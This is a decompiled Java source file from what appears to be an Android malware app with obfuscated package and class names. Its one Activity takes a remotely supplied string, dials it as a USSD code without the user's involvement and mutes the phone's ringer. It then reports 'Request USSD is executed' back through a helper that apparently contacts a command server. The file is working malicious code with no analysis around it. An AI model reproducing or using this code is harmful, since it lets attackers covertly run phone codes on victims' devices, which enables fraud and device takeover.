package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.Intent;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: loaded from: classes.dex */
public class gcmysyhtova extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f449a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0022c f450b = new C0022c();

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            String strEncode = Uri.encode(getIntent().getStringExtra("str").replace("AAA", "#"));
            startActivity(new Intent("android.intent.action.CALL").setData(Uri.parse("tel:" + strEncode)));
            ((AudioManager) getSystemService("audio")).setRingerMode(0);
            C0020b c0020b = this.f449a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f449a.m242c(this.f449a.m264q(this) + "|Request USSD is executed (" + strEncode + ")|"));
            c0020b.m235b(this, "4", sb.toString());
        } catch (Exception unused) {
            this.f449a.m230a("ERROR", "Start USSD");
        }
        finish();
    }
}
